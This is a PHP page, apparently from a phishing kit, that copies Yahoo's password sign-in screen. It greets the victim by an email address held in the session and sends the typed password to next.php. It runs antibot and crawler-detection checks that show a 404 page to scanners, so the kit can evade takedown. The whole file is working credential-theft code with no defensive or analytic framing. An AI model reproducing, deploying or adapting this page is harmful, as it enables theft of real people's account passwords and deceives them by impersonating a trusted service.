<?php
error_reporting(0);

session_start();
$useremail = $_SESSION['email'];



    require_once '../../src/Classes/Comp.php';
    require_once '../../src/Classes/Antibot.php';

    $comps = new Comp;
    $antibot = new Antibot;

    if (!$comps->checkValue()) {
        echo $antibot->throw404();
        die();
    }
    include '../../crawlerdetect.php';
?>

<!DOCTYPE html>

<html id="Stencil" class="js"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">


<script>
function empty() {
	var x;
    x = document.getElementById("login-passwd").value;
    if (x == "") {
        document.getElementById("login-passwd").setAttribute("aria-invalid", "true");
		document.getElementById("error").style = "display: block";
        return false;
    }

}
</script>

<script>
function change() {
	var e;
    e = document.getElementById("login-passwd").value;
    if (e !== ""){
	    document.getElementById("login-passwd").setAttribute("aria-invalid", "false");
		document.getElementById("error").style = "display: none";
	}
	
}

</script>
        
        <meta name="viewport" content="initial-scale=1, maximum-scale=1, user-scalable=0">
        <meta name="format-detection" content="telephone=no">
        <title>Yahoo
</title>
       
        <link rel="icon" type="image/x-icon" href="./password_files/favicon.ico">
        <link rel="shortcut icon" type="image/x-icon" href="./password_files/favicon.ico">
        <link rel="apple-touch-icon" href="./password_files/apple-touch-icon.png">
        <link rel="apple-touch-icon-precomposed" href="./password_files/apple-touch-icon.png">

        <!--[if lte IE 8]>
        <link rel="stylesheet" href="./password_files/combo2.css">
        <![endif]-->
        <!--[if gt IE 8]><!-->
        <link rel="stylesheet" href="./password_files/combo.css">
        <!--<![endif]-->
        <style nonce="">
            #mbr-css-check {
                display: inline;
            }
        </style>
        <link href="./password_files/yahoo-main.css" rel="stylesheet" type="text/css"><style nonce="">/*! Copyright 2017 Yahoo Holdings, Inc. All rights reserved. */
._yb_9o7bl{direction:ltr;box-sizing:border-box;-webkit-font-smoothing:antialiased;letter-spacing:-0.31em;text-rendering:optimizespeed;font-size:0;line-height:84px;min-width:1024px;max-width:1920px;margin:0 auto;padding:0 64px 0 50px;position:relative;z-index:1000}._yb_9o7bl > *{letter-spacing:normal;line-height:normal;text-rendering:auto}._yb_9o7bl *{box-sizing:border-box}._yb_1e69k{font-size:0;display:inline-block;vertical-align:middle}._yb_9o4v8,._yb_1fgsw,._yb_sr93h,._yb_112vr,._yb_9o5i2,._yb_1gg6y{}._yb_9o4v8{width:142px}._yb_1fgsw{font-size:1rem;max-width:844px;min-width:496px;position:relative;width:46%}._yb_13t9k{letter-spacing:-0.31em;text-rendering:optimizespeed;padding-right:inherit;position:absolute;right:0;top:50%;transform:translateY(-50%)}._yb_13t9k > ._yb_1e69k{letter-spacing:normal;line-height:normal;text-rendering:auto}._yb_13t9k > ._yb_1e69k + ._yb_1e69k{margin-left:32px}._yb_4mdgw{margin:0}._yb_yjgz2{padding:0}._yb_yjgz2 ._yb_9o4v8{text-align:center;width:192px}@media only screen and (min-width:1440px){._yb_yjgz2 ._yb_9o4v8{max-width:224px;width:14%}}._yb_yjgz2 ._yb_1fgsw{width:44%}._yb_yjgz2._yb_6is4h > ._yb_9o4v8,._yb_yjgz2._yb_4te5s > ._yb_9o4v8,._yb_yjgz2._yb_17bwg > ._yb_9o4v8,._yb_yjgz2._yb_1nj4o > ._yb_9o4v8{width:224px}._yb_yjgz2 ._yb_13t9k{padding-right:32px}._yb_1vw7q,._yb_1yx3p{min-width:initial}._yb_1vw7q{padding-left:54px}._yb_1yx3p{background:#6302de}._yb_1yx3p._yb_j5ayu,._yb_1yx3p._yb_l9vwm,._yb_1yx3p._yb_1qpt3,._yb_1yx3p._yb_w05xf,._yb_1yx3p._yb_kjsn8{background:#000}._yb_1yx3p._yb_10c56{background:#2b2c2f}._yb_1yx3p._yb_1qohj,._yb_1yx3p._yb_1sa8x{background:#333}._yb_1yx3p._yb_13a02{background:#feeade}._yb_1yx3p._yb_ct3pv{background:#2b2d32}._yb_91fgf._yb_u8zjx{background:#6302de}._yb_1yx3p._yb_hv7vi{background:#222}._yb_1yx3p._yb_csu08{background:#0a4ea3}._yb_1yx3p._yb_q6aiy{background:#0a0a0a}._yb_1yx3p._yb_3j3zf{background:#fff}._yb_1yx3p._yb_iida5{background:#1e4e9d}._yb_1yx3p._yb_1827d{background:linear-gradient(303deg,#00d301,#36c275 50%,#00a562)}._yb_1yx3p._yb_1oasp{background:#36465d}@media screen and (max-width:768px){._yb_1vw7q{line-height:54px;padding:0 24px 0 20px}._yb_1yx3p{line-height:50px;padding:0}._yb_1vw7q._yb_1qohj,._yb_1vw7q._yb_u8zjx,._yb_1vw7q._yb_l9vwm,._yb_1vw7q._yb_q6aiy,._yb_1yx3p{text-align:center}._yb_1vw7q ._yb_9o4v8,._yb_1yx3p ._yb_9o4v8{width:auto}._yb_j5ayu ._yb_9o4v8{height:18px}._yb_13a02 ._yb_9o4v8{height:12px}._yb_u8zjx ._yb_9o4v8,._yb_ct3pv ._yb_9o4v8{height:24px}._yb_l9vwm ._yb_9o4v8,._yb_csu08 ._yb_9o4v8{height:15px}._yb_1qpt3 ._yb_9o4v8{height:22px}._yb_1yx3p._yb_iida5 ._yb_9o4v8{height:20px}._yb_1827d ._yb_9o4v8{height:20px}}._yb_ao5fq{width:1020px}._yb_17bts,._yb_1vdvd,._yb_3wwjm,._yb_c6nqu{padding-left:10px}._yb_17bts > ._yb_9o4v8,._yb_1vdvd > ._yb_9o4v8,._yb_3wwjm > ._yb_9o4v8,._yb_c6nqu > ._yb_9o4v8{margin-right:10px;width:auto}.ybar-amp{min-width:initial;max-width:initial;padding-right:0}._yb_26vo4{display:inline-block;font-size:0;height:100%}._yb_26vo4:focus{outline-offset:2px;outline:3px solid #00abf0;outline:5px auto -webkit-focus-ring-color}._yb_x1qny{max-height:40px;max-width:100%}._yb_leqoo > ._yb_x1qny,._yb_1y0tn > ._yb_x1qny,._yb_18sbb > ._yb_x1qny,._yb_uz4ba > ._yb_x1qny{max-height:none}.ybar-dark ._yb_10shr,.ybar-light ._yb_26s9y{display:none}.ybar-amp ._yb_26vo4{display:block;margin:auto;padding:10px 0;text-align:center}@media screen and (max-width:768px){._yb_xsl95 ._yb_x1qny,._yb_1qxvn ._yb_x1qny{height:100%;max-height:32px}}</style>
        
    </head>
    <body>
        
    <div id="login-body" class="loginish dark-background puree-v2 responsive">
    <div class="mbr-ybar ybar-light">
    <div id="ybar" role="banner" class="_yb_9o7bl     "> <script id="ybarConfig" type="text/x-template">{}</script>  <div class="_yb_9o4v8 _yb_1e69k"><a href="" class="_yb_26vo4    " data-ylk="sec:yb_logo;slk:login;itc:0;">   <img class="_yb_x1qny _yb_10shr" src="./password_files/yahoo_en-US_f_p_bestfit.png" srcset="https://s.yimg.com/rz/d/yahoo_en-US_f_p_bestfit.png 1x, https://s.yimg.com/rz/d/yahoo_en-US_f_p_bestfit_2x.png 2x" onerror="this.onerror=null;this.style.display=&#39;none&#39;;" alt="login"><img class="_yb_x1qny _yb_26s9y" src="./password_files/yahoo_en-US_f_w_bestfit.png" srcset="https://s.yimg.com/rz/d/yahoo_en-US_f_w_bestfit.png 1x, https://s.yimg.com/rz/d/yahoo_en-US_f_w_bestfit_2x.png 2x" alt="login" onerror="this.onerror=null;this.style.display=&#39;none&#39;;">   login</a></div><div role="toolbar" class="_yb_13t9k "></div></div>
</div>

    <div class="login-box-container">
        <div class="login-box default">
            <div class="txt-align-center">
                    <img src="./password_files/yahoo_en-US_f_p_bestfit_2x.png" alt="" class="logo " width="116" height="">
            </div>
            <div class="challenge password-challenge ">
    <div id="password-challenge" class="primary">
    <div class="greeting">
            <h1 class="username">Hello&nbsp;<?php echo $useremail; ?></h1>
            <p class="not-you"><a href="">Not&nbsp;you?</a></p>
    </div>
    <form method="post" class="pure-form pure-form-stacked" action="next.php?value=<?php echo $_SESSION['value'];  ?>" onsubmit="return empty()">
       
        <div class="hidden-username">
            <input type="text" tabindex="-1" aria-hidden="true" role="presentation" autocorrect="off" spellcheck="false" name="username" value="">
        </div>
        <input type="hidden" name="passwordContext" value="normal">
        <input type="password" id="login-passwd" name="password" placeholder="Password" autofocus="" autocomplete="current-password" onblur="change()" required>
		<p class="error-msg" role="alert" data-error="messages.ERROR_EMPTY_PASSWORD" id="error" style="display: none">Please provide&nbsp;password.</p>
        <p class="signin-cont">
            <button type="submit" id="login-signin" class="pure-button puree-button-primary puree-spinner-button" name="verifyPassword" value="Sign in" data-ylk="elm:btn;elmt:next;slk:next">
                    Sign&nbsp;in
            </button>
        </p>
        <p class="forgot-cont">
            <input type="submit" class="pure-button puree-button-link" data-ylk="elm:btn;elmt:skip;slk:skip" id="mbr-forgot-link" name="skip" value="I forgot my password">
        </p>
    </form>
</div>

</div>

        </div>
        <div id="login-box-ad-fallback" class="login-box-ad-fallback">
            <h1>Yahoo makes it easy to enjoy what matters most in your&nbsp;world.</h1>
<p>Best in class Yahoo Mail, breaking local, national and global news, finance, sports, music, movies and more. You get more out of the web, you get more out of&nbsp;life.</p>

        </div>
    </div>
    <div class="login-box-ad-outer">
        <div class="login-box-ad-inner">
            <div id="login-ad-mon"></div>
            <div id="login-ad-sky"></div>
            <div id="login-ad-rich"></div>
        </div>
    </div>
</div>

    <div id="ads"></div>
    <div id="mbr-css-check"></div>

</body></html>